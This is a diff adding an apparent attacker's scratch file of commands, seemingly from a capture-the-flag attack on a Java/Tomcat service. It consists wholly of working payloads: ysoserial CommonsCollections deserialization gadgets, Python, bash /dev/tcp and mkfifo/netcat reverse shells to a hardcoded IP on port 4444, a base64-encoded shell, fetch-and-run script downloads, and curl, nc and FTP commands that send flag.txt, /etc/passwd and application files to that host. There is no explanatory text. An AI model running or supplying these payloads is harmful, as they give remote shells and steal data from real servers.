@@ -1,0 +1,82 @@
+ftp server:
+sudo python3 -m pyftpdlib -p 21 -w -r 20-20
+
+
+
+
+
+java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections3 'command'
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.55.153.92",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+java -jar ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'python -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.55.153.92",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"'"''
+
+echo 'python -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.55.153.92",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"'"''
+
+
+cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiNTIuNTUuMTUzLjkyIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnCg==
+
+
+working:
+
+java -jar ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 '/bin/bash -c '"'"'curl 52.55.153.92:4444/file'"'"'' | base64 -w 0 | xclip -selection c
+
+
+
+java -jar ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'touch images/output' | base64 -w 0
+
+curl 52.55.153.92:4444/test && curl 52.55.153.92:4444/test2
+curl 52.55.153.92:4444/script.sh -o /tmp/script.sh | sh /tmp/script.sh
+
+bash -c "curl 52.55.153.92:4444/bashworks"
+
+curl -X POST --data-binary @flag.txt 52.55.153.92:4444/test
+
+curl -F file=@flag.txt 52.55.153.92:4444/file
+
+FILE=$(cat flag.txt) && curl -d $FILE 52.55.153.92:4444/
+
+nc 52.55.153.92 4444 < flag.txt
+
+id | curl 52.55.153.92:4444/file
+curl -d `which sh` 52.55.153.92:4444/file
+
+/bin/bash -c 'curl 52.55.153.92:4444/file'
+
+'/bin/bash -c '"'"'curl 52.55.153.92:4444/file'"'"' '
+
+cp flag.txt images/
+
+'"'"'
+curl 52.55.153.92:4444/cmd1; curl 52.55.153.92:4444/cmd2
+
+if [ 1 == 1 ] ; then curl 52.55.153.92:4444/ifworks ; fi
+
+curl -o /dev/shm/shell.sh 52.55.153.92:4444/script.sh && sh /dev/shm/shell.sh
+
+
+curl -T app.py ftp://anonymous:anonymous@52.55.153.92/upload/
+
+
+cat flag.txt | curl –F ':data=@-' 52.55.153.92:4444/cmd1
+
+curl -T flag.txt ftp://52.55.153.92:4444 -user=anonymous:anonymous
+ftp 52.55.153.92 4444
+
+touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 52.55.153.92 4444 > /tmp/f
+
+
+java -jar ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 "bash -c 'bash -i >& /dev/tcp/52.55.153.92/4444 0>&1'"
+
+curl -T /etc/passwd --no-epsv -v ftp://anonymous:anonymous@52.55.153.92/upload/testpasswd 
+curl -T /etc/issue --no-epsv -v ftp://anonymous:anonymous@52.55.153.92/issue 
+curl -T /opt/tomcat/latest/webapps/ROOT/index.jsp --no-epsv -v ftp://anonymous:anonymous@52.55.153.92/ 
+
+
+/usr/share/tomcat9/conf/web.xml
+
+
+curl -o /tmp/script.sh 52.55.153.92:4444/script.sh
+bash /tmp/script.sh
+curl -T /tmp/output ftp://anonymous:anonymous@52.55.153.92/output
